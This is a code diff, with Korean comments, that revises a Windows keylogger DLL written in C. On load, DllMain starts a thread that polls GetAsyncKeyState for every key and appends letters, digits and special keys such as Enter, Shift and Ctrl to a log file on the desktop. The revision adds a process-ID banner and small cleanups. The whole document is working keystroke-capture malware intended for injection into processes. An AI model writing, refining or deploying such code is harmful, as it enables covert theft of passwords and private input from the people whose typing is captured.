@@ -3,55 +3,64 @@
 
 #define LOG_FILE "C:\\Users\\namkg\\Desktop\\keylog_dll.txt"
 
-// 키 상태 추적 배열 (중복 방지)
-static BOOL keyPressed[256] = {FALSE};
+// 전역 변수: 키 상태 추적
+static BOOL g_keyState[256] = {0};
 
-void LogKey(int key) {
-    FILE* logFile = fopen(LOG_FILE, "a");
-    if (logFile == NULL) return;
+void LogKey(int vkCode) {
+    FILE* fp = fopen(LOG_FILE, "a");
+    if (!fp) return;
 
-    if ((key >= 'A' && key <= 'Z') || (key >= '0' && key <= '9')) {
-        fprintf(logFile, "%c", key);
+    // 영문자, 숫자
+    if ((vkCode >= 0x41 && vkCode <= 0x5A) || (vkCode >= 0x30 && vkCode <= 0x39)) {
+        fputc((char)vkCode, fp);
     }
-    else if (key == VK_SPACE) fprintf(logFile, " ");
-    else if (key == VK_RETURN) fprintf(logFile, "[ENTER]\n");
-    else if (key == VK_BACK) fprintf(logFile, "[BACK]");
-    else if (key == VK_TAB) fprintf(logFile, "[TAB]");
-    else if (key == VK_SHIFT) fprintf(logFile, "[SHIFT]");
-    else if (key == VK_CONTROL) fprintf(logFile, "[CTRL]");
-    else if (key == VK_MENU) fprintf(logFile, "[ALT]");
+    // 특수 키
+    else if (vkCode == VK_SPACE) fputc(' ', fp);
+    else if (vkCode == VK_RETURN) fprintf(fp, "[ENTER]\n");
+    else if (vkCode == VK_BACK) fprintf(fp, "[BACK]");
+    else if (vkCode == VK_TAB) fprintf(fp, "[TAB]");
+    else if (vkCode == VK_SHIFT) fprintf(fp, "[SHIFT]");
+    else if (vkCode == VK_CONTROL) fprintf(fp, "[CTRL]");
+    else if (vkCode == VK_MENU) fprintf(fp, "[ALT]");
 
-    fclose(logFile);
+    fflush(fp);
+    fclose(fp);
 }
 
-DWORD WINAPI KeyloggerThread(LPVOID lpParam) {
-    FILE* logFile = fopen(LOG_FILE, "a");
-    if (logFile) {
-        fprintf(logFile, "\n=== Keylogger Started ===\n");
-        fclose(logFile);
+DWORD WINAPI KeyloggerThread(LPVOID param) {
+    // 시작 로그 (PID 포함으로 중복 확인)
+    FILE* fp = fopen(LOG_FILE, "a");
+    if (fp) {
+        fprintf(fp, "\n=== Keylogger Started (PID: %d) ===\n", GetCurrentProcessId());
+        fclose(fp);
     }
 
+    // 메인 루프
     while (1) {
-        for (int i = 8; i < 256; i++) {
-            SHORT keyState = GetAsyncKeyState(i);
+        for (int vk = 8; vk < 256; vk++) {
+            SHORT state = GetAsyncKeyState(vk);
+            BOOL isPressed = (state & 0x8000) != 0;
             
-            // 키가 새로 눌렸을 때만 기록 (중복 방지!)
-            if ((keyState & 0x8000) && !keyPressed[i]) {
-                LogKey(i);
-                keyPressed[i] = TRUE;
+            // 키가 새로 눌렸을 때만 기록
+            if (isPressed && !g_keyState[vk]) {
+                LogKey(vk);
+                g_keyState[vk] = TRUE;
             }
-            // 키가 떼어졌을 때 상태 초기화
-            else if (!(keyState & 0x8000) && keyPressed[i]) {
-                keyPressed[i] = FALSE;
+            // 키가 떼어졌을 때
+            else if (!isPressed && g_keyState[vk]) {
+                g_keyState[vk] = FALSE;
             }
         }
-        Sleep(10);  // CPU 부하 감소
+        
+        Sleep(15);  // 15ms 대기
     }
+    
     return 0;
 }
 
-BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
-    if (dwReason == DLL_PROCESS_ATTACH) {
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
+    if (reason == DLL_PROCESS_ATTACH) {
+        DisableThreadLibraryCalls(hModule);
         CreateThread(NULL, 0, KeyloggerThread, NULL, 0, NULL);
     }
     return TRUE;
